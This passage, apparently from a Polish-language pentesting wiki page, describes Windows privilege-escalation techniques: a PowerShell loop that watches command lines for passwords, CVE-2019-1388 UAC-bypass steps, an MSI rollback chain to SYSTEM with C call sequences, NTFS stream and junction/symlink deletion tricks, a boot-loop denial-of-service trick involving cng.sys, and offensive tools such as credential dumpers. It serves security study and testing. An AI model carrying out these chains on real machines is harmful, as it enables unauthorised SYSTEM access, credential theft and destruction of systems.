telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Różne

### Rozszerzenia plików, które mogą uruchamiać kod w Windows

Zajrzyj na stronę **[https://filesec.io/](https://filesec.io/)**

### Nadużywanie obsługi protokołów / ShellExecute przez renderery Markdown

Klikalne linki Markdown przekazywane do `ShellExecuteExW` mogą uruchamiać niebezpieczne handlery URI (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany schemat) i wykonywać pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorowanie wierszy poleceń w poszukiwaniu haseł**

Po uzyskaniu shella jako użytkownik mogą być uruchamiane zaplanowane zadania lub inne procesy, które **przekazują dane uwierzytelniające w wierszu poleceń**. Poniższy skrypt przechwytuje wiersze poleceń procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wyświetlając wszelkie różnice.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Wykradanie haseł z procesów

## Od użytkownika o niskich uprawnieniach do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP), a funkcja UAC jest włączona, w niektórych wersjach Microsoft Windows można uruchomić terminal lub dowolny inny proces jako „NT\AUTHORITY SYSTEM”, będąc nieuprzywilejowanym użytkownikiem.

Umożliwia to jednoczesne eskalowanie uprawnień i obejście UAC z wykorzystaniem tej samej podatności. Nie trzeba też niczego instalować, a plik binarny używany podczas tego procesu jest podpisany i wydany przez Microsoft.

Do systemów, których dotyczy problem, należą między innymi:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Aby exploitować tę podatność, należy wykonać następujące kroki:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Masz wszystkie niezbędne pliki i informacje w tym repozytorium GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od poziomu integralności Medium administratora do High / obejście UAC

Przeczytaj to, aby **dowiedzieć się o poziomach integralności**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj to, aby dowiedzieć się o UAC i jego obejściach:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Przekierowanie junctions z katalogu upload do katalogu głównego serwera

Aplikacja może tworzyć przewidywalny podkatalog upload, zapisywać w nim plik pod nazwą podaną przez użytkownika, a następnie go przetwarzać. Jeśli użytkownik z niskimi uprawnieniami może usunąć ten podkatalog i zastąpić go junction NTFS przed zapisem po stronie serwera, zapis może zostać przekierowany przez junction do katalogu udostępnianego przez serwer WWW. Umieszczony tam skrypt może zostać uruchomiony z tożsamością usługi WWW, jeśli serwer wykonuje pliki tego typu. To specyficzna dla aplikacji granica arbitralnego zapisu; sam zapisywalny katalog upload lub istniejący junction nie są wystarczającym dowodem.

Sprawdź dokładny sposób konstruowania ścieżki i moment operacji w obsłudze uploadu, efektywne uprawnienia użytkownika do usuwania i tworzenia podkatalogu, efektywne ACL miejsca docelowego, to, czy proces zapisujący podąża za punktami ponownej analizy, oraz to, czy serwer WWW wykonuje pliki w tym miejscu docelowym. Oddzielnie potwierdź tożsamości procesów procesu zapisującego i serwera WWW. Pasywna inwentaryzacja może wykazać ACL katalogów i metadane punktów ponownej analizy, ale nie pozwala ustalić zachowania obsługi ani przyszłej podmiany junction. Jeśli wykonanie następuje w kontekście konta usługi, przed rozważeniem odrębnej ścieżki wykorzystującej uprawnienia tokenu sprawdź **rzeczywisty token procesu**.

## Od arbitralnego usuwania/przenoszenia/zmiany nazwy folderu do EoP do SYSTEM

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), a kod exploita jest [**dostępny tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Atak polega na wykorzystaniu funkcji wycofywania zmian Windows Installer, aby podczas odinstalowywania zastąpić legalne pliki złośliwymi. W tym celu atakujący musi utworzyć **złośliwy instalator MSI**, który posłuży do przejęcia katalogu `C:\Config.Msi`. Windows Installer użyje go później do przechowywania plików wycofywania zmian podczas odinstalowywania innych pakietów MSI; pliki te zostaną wcześniej zmodyfikowane tak, by zawierały złośliwy payload.

### Wstrzyknięcie ścieżki czyszczenia COM Windows Installer (CVE-2025-27727)

Klient z niskimi uprawnieniami może uzyskać dostęp do usługi SYSTEM `msiexec.exe` za pośrednictwem obiektu COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Inżynieria wsteczna pozwoliła zidentyfikować odpowiednie wywołania `IMsiServer`: `MsiBeginTransactionW` pod offsetem vtable `0xA0`, `SetEEUIDirectoryAndFilter` pod `0xC8` oraz `CleanupTempPackages` pod `0x50`. Nazwy i offsety ustalono w drodze inżynierii wstecznej i mogą się różnić w zależności od kompilacji.<sup>[[41]](#references)</sup>

W przypadku użytkownika niebędącego administratorem `SetEEUIDirectoryAndFilter` podszywa się pod użytkownika wyłącznie podczas otwierania podanej ścieżki z flagami `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Dowodzi to, że użytkownik może usunąć katalog, i zapobiega podążaniu za punktem ponownej analizy, ale **nie** wiąże sprawdzonego obiektu pliku z późniejszym czyszczeniem ani nie dowodzi, że utworzył go Windows Installer.<sup>[[41]](#references)</sup>

Po `MsiBeginTransactionW` metoda `SetEEUIDirectoryAndFilter` dodaje ścieżkę do kolejki jako folder, niezależnie od argumentu filtra podanego przez użytkownika. Usługa zapisuje nazwaną wartość `REG_DWORD` w `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: nazwą wartości jest ścieżka kontrolowana przez użytkownika, a dane `0x00000002` oznaczają flagę folderu. Następnie `CleanupTempPackages(NULL, FALSE)` bezpośrednio uruchamia procedurę czyszczenia. Podwyższony worker wylicza wartości rejestru i przekazuje wpisy folderów do rekurencyjnej funkcji `FDeleteFolder`, nie sprawdzając pochodzenia ścieżek. Jeśli standardowe usunięcie się nie powiedzie, kod wywołuje również `LockdownPath`, czyści atrybuty plików i ponawia próbę.<sup>[[41]](#references)</sup>

Minimalna sekwencja wywołań odtworzona z `msi.dll`:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Przydatnym prymitywem jest ponowne użycie ścieżki, a nie przekierowanie przez junction. Zarejestruj utworzony przez atakującego katalog `C:\Config.Msi`, usuń go i pozwól, aby Windows Installer później odtworzył tę samą ścieżkę z chronionymi danymi wycofywania zmian. Podczas czyszczenia system ufa nieaktualnej nazwie `TempPackages` i usuwa nowy katalog jako SYSTEM. To omija zamierzoną granicę ochrony zapewnianą przez `FILE_FLAG_OPEN_REPARSE_POINT` i mechanizm ograniczający zaufanie do przekierowań, ponieważ nie jest wymagany żaden reparse point.<sup>[[41]](#references)</sup>

Ten prymityw usuwania pasuje do poniższego łańcucha wycofywania zmian: zachowaj osobny wpis `Installer\Folders`, usuń chroniony katalog `C:\Config.Msi`, odtwórz go z NULL DACL i zachowaj uchwyt z uprawnieniem `WRITE_DAC`, otwarty przed zaostrzeniem DACL przez instalator. Wcześniej otwarty uchwyt może przywrócić liberalny DACL za pomocą `NtSetSecurityObject`, po czym wygenerowany plik `.rbs` można podmienić przed wznowieniem wycofywania zmian.<sup>[[41]](#references)</sup>

Microsoft naprawił tę ścieżkę, uniemożliwiając `CMsiTransaction::SetEEUIDirectoryAndFilter` wywołanie `ScheduleFileOrFolderDelete`, gdy włączona jest nowa funkcja ochronna. Wywołanie COM nadal może zwrócić sukces, ale ścieżka kontrolowana przez atakującego nie jest już dodawana do `TempPackages`. Zainstaluj aktualizacje zabezpieczeń Windows z kwietnia 2025 r., zamiast traktować pomyślny wynik metody jako test poprawki.<sup>[[41]](#references)[[42]](#references)</sup>

Podsumowanie techniki:

1. **Etap 1 – Przygotowanie do przejęcia (pozostawienie pustego `C:\Config.Msi`)**

- Krok 1: Zainstaluj MSI
    - Utwórz plik `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
    - Oznacz instalator jako **„UAC Compliant”**, aby **użytkownik bez uprawnień administratora** mógł go uruchomić.
    - Po instalacji pozostaw otwarty **uchwyt** do pliku.

- Krok 2: Rozpocznij odinstalowywanie
    - Odinstaluj ten sam plik `.msi`.
    - Proces odinstalowywania zacznie przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (kopie zapasowe do wycofywania zmian).
    - **Sprawdzaj otwarty uchwyt** za pomocą `GetFinalPathNameByHandle`, aby wykryć, kiedy plik stanie się `C:\Config.Msi\<random>.rbf`.

- Krok 3: Własna synchronizacja
    - Plik `.msi` zawiera **własną akcję odinstalowywania (`SyncOnRbfWritten`)**, która:
        - Sygnalizuje zapisanie pliku `.rbf`.
        - Następnie **czeka** na inne zdarzenie przed kontynuowaniem odinstalowywania.

- Krok 4: Zablokuj usunięcie pliku `.rbf`
    - Po otrzymaniu sygnału **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — **uniemożliwi to jego usunięcie**.
    - Następnie **wyślij sygnał zwrotny**, aby odinstalowywanie mogło się zakończyć.
    - Windows Installer nie może usunąć pliku `.rbf`, a ponieważ nie może usunąć całej zawartości, **katalog `C:\Config.Msi` nie zostaje usunięty**.

- Krok 5: Ręcznie usuń plik `.rbf`
    - Ręcznie usuń plik `.rbf`.
    - Teraz **katalog `C:\Config.Msi` jest pusty** i gotowy do przejęcia.

> W tym momencie **uruchom podatność umożliwiającą usunięcie dowolnego folderu z uprawnieniami SYSTEM**, aby usunąć `C:\Config.Msi`.

2. **Etap 2 – Zastępowanie skryptów wycofywania zmian złośliwymi**

- Krok 6: Odtwórz `C:\Config.Msi` z osłabionymi ACL
    - Samodzielnie odtwórz folder `C:\Config.Msi`.
    - Ustaw **osłabione DACL** (np. Everyone:F) i **pozostaw otwarty uchwyt** z uprawnieniem `WRITE_DAC`.

- Krok 7: Uruchom kolejną instalację
    - Ponownie zainstaluj plik `.msi`, ustawiając:
        - `TARGETDIR`: zapisywalna lokalizacja.
        - `ERROROUT`: zmienna powodująca wymuszone niepowodzenie.
    - Ta instalacja posłuży do ponownego uruchomienia **wycofywania zmian**, które odczytuje pliki `.rbs` i `.rbf`.

- Krok 8: Monitoruj pojawienie się pliku `.rbs`
    - Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi`, aż pojawi się nowy plik `.rbs`.
    - Zapisz jego nazwę.

- Krok 9: Synchronizuj przed wycofywaniem zmian
    - Plik `.msi` zawiera **własną akcję instalacji (`SyncBeforeRollback`)**, która:
        - Sygnalizuje zdarzenie po utworzeniu pliku `.rbs`.
        - Następnie **czeka** przed kontynuowaniem.

- Krok 10: Ponownie zastosuj osłabione ACL
    - Po otrzymaniu zdarzenia `plik .rbs utworzony`:
        - Windows Installer **ponownie stosuje silne ACL** do `C:\Config.Msi`.
        - Ponieważ nadal masz uchwyt z uprawnieniem `WRITE_DAC`, możesz **ponownie zastosować osłabione ACL**.

> ACL są **weryfikowane tylko podczas otwierania uchwytu**, więc nadal możesz zapisywać do folderu.

- Krok 11: Umieść fałszywe pliki `.rbs` i `.rbf`
    - Zastąp plik `.rbs` **fałszywym skryptem wycofywania zmian**, który każe Windows:
        - Przywrócić plik `.rbf` (złośliwą bibliotekę DLL) w **uprzywilejowanej lokalizacji** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Umieść fałszywy plik `.rbf` zawierający **złośliwy ładunek DLL działający na poziomie SYSTEM**.

- Krok 12: Uruchom wycofywanie zmian
    - Wyślij sygnał synchronizacyjny, aby instalator wznowił działanie.
    - Skonfigurowano **własną akcję typu 19 (`ErrorOut`)**, która **celowo powoduje niepowodzenie instalacji** w znanym momencie.
    - Powoduje to **rozpoczęcie wycofywania zmian**.

- Krok 13: SYSTEM instaluje Twoją bibliotekę DLL
    - Windows Installer:
        - Odczytuje złośliwy plik `.rbs`.
        - Kopiuje bibliotekę DLL z pliku `.rbf` do lokalizacji docelowej.
    - Złośliwa biblioteka DLL znajduje się teraz **w ścieżce, z której ładuje ją SYSTEM**.

- Ostatni krok: Wykonaj kod jako SYSTEM
    - Uruchom zaufany **automatycznie podwyższający uprawnienia plik binarny** (np. `osk.exe`), który ładuje przejętą bibliotekę DLL.
    - **Gotowe**: Twój kod zostaje wykonany **jako SYSTEM**.


### Od usuwania/przenoszenia/zmiany nazwy dowolnego pliku do SYSTEM EoP

Główna technika wycofywania zmian MSI (opisana wcześniej) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co, jeśli podatność pozwala tylko na **usuwanie dowolnego pliku**?

Możesz wykorzystać **wewnętrzne mechanizmy NTFS**: każdy folder ma ukryty alternatywny strumień danych o nazwie:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ten strumień przechowuje **metadane indeksu** folderu.

Jeśli więc **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usunie cały folder** z systemu plików.

Możesz to zrobić za pomocą standardowych API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mimo że wywołujesz API usuwania *pliku*, **usuwa ono sam folder**.

### Od usuwania zawartości folderu do SYSTEM EoP
Co jeśli Twoja prymitywna operacja nie pozwala usuwać dowolnych plików/folderów, ale **pozwala usuwać *zawartość* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder-przynętę i plik
- Utwórz: `C:\temp\folder1`
- W środku utwórz: `C:\temp\folder1\file1.txt`

2. Krok 2: Ustaw **oplock** na `file1.txt`
- **Oplock** **wstrzymuje wykonywanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Krok 3: Wyzwól proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock zostaje wyzwolony** i przekazuje kontrolę do Twojego callbacka.

4. Krok 4: W callbacku oplocka — przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` w inne miejsce
    - Dzięki temu `folder1` zostanie opróżniony bez przerwania oplocka.
    - Nie usuwaj bezpośrednio `file1.txt` — spowodowałoby to przedwczesne zwolnienie oplocka.

- Opcja B: Zamień `folder1` w **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> To celuje w wewnętrzny strumień NTFS, w którym przechowywane są metadane folderu — jego usunięcie usuwa folder.

5. Krok 5: Zwolnij oplock
- Proces SYSTEM kontynuuje działanie i próbuje usunąć `file1.txt`.
- Jednak teraz, z powodu junction + symlink, w rzeczywistości usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Wynik**: `C:\Config.Msi` zostaje usunięty przez SYSTEM.

### Od utworzenia dowolnego folderu do trwałego DoS

Wykorzystaj prymityw pozwalający **utworzyć dowolny folder jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```

- Ta ścieżka zwykle odpowiada sterownikowi trybu jądra `cng.sys`.
- Jeśli **utworzysz wcześniej w tym miejscu folder**, Windows nie załaduje właściwego sterownika podczas uruchamiania.
- Następnie Windows próbuje załadować `cng.sys` podczas uruchamiania.
- Napotyka folder, **nie może odnaleźć właściwego sterownika** i **ulega awarii lub zatrzymuje proces uruchamiania**.
- **Nie ma mechanizmu awaryjnego** ani **możliwości odzyskania systemu** bez zewnętrznej interwencji (np. naprawy rozruchu lub dostępu do dysku).

### Od uprzywilejowanych ścieżek logów/kopii zapasowych + dowiązań symbolicznych OM do nadpisania dowolnego pliku / DoS podczas uruchamiania

Gdy **uprzywilejowana usługa** zapisuje logi/eksporty w ścieżce odczytanej z **konfiguracji z prawem zapisu**, przekieruj tę ścieżkę za pomocą **dowiązań symbolicznych Object Manager + punktów montowania NTFS**, aby zmienić uprzywilejowany zapis w nadpisanie dowolnego pliku (nawet **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Wymagania**
- Konfiguracja przechowująca ścieżkę docelową jest zapisywalna przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia punktu montowania do `\RPC Control` i dowiązania symbolicznego pliku OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Uprzywilejowana operacja zapisująca w tej ścieżce (log, eksport, raport).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby ustalić docelową ścieżkę uprzywilejowanego logu, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator wybierze opcję „wyślij testowy SMS”). Zapis trafi teraz do `C:\Windows\System32\cng.sys`.
4. Sprawdź nadpisany plik docelowy (parser hex/PE), aby potwierdzić jego uszkodzenie; ponowne uruchomienie wymusza załadowanie przez Windows zmodyfikowanej ścieżki sterownika → **DoS powodujący pętlę rozruchową**. Ta metoda działa również w przypadku każdego chronionego pliku, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli jego kopia znajduje się w `C:\Windows\System32\cng.sys`, może zostać wypróbowana jako pierwsza, co czyni ją niezawodnym celem DoS dla uszkodzonych danych.



## **Od High Integrity do System**

### **Nowa usługa**

Jeśli proces działa już z poziomem High Integrity, **ścieżka do SYSTEM** może być prosta — wystarczy **utworzyć i uruchomić nową usługę**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Podczas tworzenia pliku binarnego usługi upewnij się, że jest poprawną usługą lub że plik binarny szybko wykonuje wymagane działania, ponieważ zostanie zakończony po 20 s, jeśli nie jest poprawną usługą.

### AlwaysInstallElevated

Z procesu o High Integrity możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell za pomocą opakowania _**.msi**_.\
[Więcej informacji o powiązanych kluczach rejestru i instalowaniu pakietu _.msi_ znajdziesz tutaj.](#alwaysinstallelevated)

### High + uprawnienie SeImpersonate do System

**Możesz** [**znaleźć kod tutaj**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do uprawnień Full Token

Jeśli masz te uprawnienia tokenu (prawdopodobnie znajdziesz je w procesie o High Integrity), będziesz w stanie **otworzyć niemal dowolny proces** (z wyjątkiem procesów chronionych) dzięki uprawnieniu SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Ta technika zwykle polega na **wybraniu dowolnego procesu działającego jako SYSTEM z pełnym zestawem uprawnień tokenu** (_tak, można znaleźć procesy SYSTEM bez pełnego zestawu uprawnień tokenu_).\
**Przykład kodu wykorzystującego opisaną technikę znajdziesz** [**tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Tej techniki używa meterpreter do eskalacji uprawnień w `getsystem`. Polega ona na **utworzeniu pipe, a następnie utworzeniu lub nadużyciu usługi, aby zapisywała do tego pipe**. Następnie **serwer**, który utworzył pipe przy użyciu uprawnienia **`SeImpersonate`**, będzie mógł **podszyć się pod token** klienta pipe (usługi), uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o name pipes, przeczytaj ten artykuł**](#named-pipe-client-impersonation).\
Jeśli chcesz zobaczyć przykład [**przejścia z High Integrity do System przy użyciu name pipes, przeczytaj ten artykuł**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **przejąć dll**, która jest **ładowana** przez **proces** działający jako **SYSTEM**, będziesz w stanie wykonać dowolny kod z uprawnieniami tego procesu. Dlatego Dll Hijacking przydaje się również do tego rodzaju eskalacji uprawnień, a ponadto jest **znacznie łatwiejszy do przeprowadzenia z procesu o High Integrity**, ponieważ taki proces ma **uprawnienia do zapisu** w folderach używanych do ładowania dll.\
**Możesz** [**dowiedzieć się więcej o Dll hijacking tutaj**](dll-hijacking/index.html)**.**

### **Od Administrator lub Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE lub NETWORK SERVICE do pełnych uprawnień

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Najlepsze narzędzie do wyszukiwania lokalnych wektorów eskalacji uprawnień Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Wyszukuje błędne konfiguracje i wrażliwe pliki (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykrywane.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Wyszukuje możliwe błędne konfiguracje i zbiera informacje (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Wyszukuje błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wyodrębnia zapisane informacje o sesjach PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Lokalnie użyj opcji -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wyodrębnia poświadczenia z Credential Manager. Wykrywane.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Przeprowadza password spray z zebranymi hasłami w domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do spoofingu ADIDNS/LLMNR/mDNS oraz ataków man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowe rozpoznanie Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Wyszukuje znane podatności privesc (PRZESTARZAŁE, zastąpione przez Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne kontrole **(wymagane uprawnienia Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane podatności privesc (należy skompilować za pomocą VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Przeszukuje hosta pod kątem błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż privesc) (wymaga kompilacji) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wyodrębnia poświadczenia z wielu programów (precompiled exe dostępny na GitHubie)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Wyszukuje błędne konfiguracje (precompiled executable dostępny na GitHubie). Niezalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Wyszukuje możliwe błędne konfiguracje (exe z Pythona). Niezalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie utworzone na podstawie tego wpisu (do poprawnego działania nie wymaga accesschk, ale może go używać).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik polecenia **systeminfo** i wskazuje działające exploity (lokalny Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik polecenia **systeminfo** i wskazuje działające exploity (lokalny Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekt należy skompilować przy użyciu odpowiedniej wersji .NET ([zobacz tutaj](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby sprawdzić zainstalowaną wersję .NET na hoście ofiary, możesz wykonać:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Podstawy eskalacji uprawnień w Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Podnoszenie uprawnień przez wykorzystanie słabych uprawnień do folderów](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacja uprawnień w Windows — ściąga](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — warsztaty z lokalnej eskalacji uprawnień w Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — ataki na Windows: AT to nowa czerń (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacja uprawnień — Windows — kompletny przewodnik OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — eskalacja uprawnień — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Przewodnik po eskalacji uprawnień w Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista kontrolna eskalacji uprawnień w Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacja uprawnień w Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metody eskalacji uprawnień w Windows dla pentesterów](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing z makrem Word VBA przez SMTP → odszyfrowanie danych logowania hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format-string + stack BOF → VirtualAlloc ROP (RCE) i kradzież tokena jądra](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — śladami Silver Fox: kot i mysz w cieniu jądra](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — luka w systemie plików z uprawnieniami podwyższonymi w systemie SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Narzędzia do testowania dowiązań symbolicznych — użycie CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
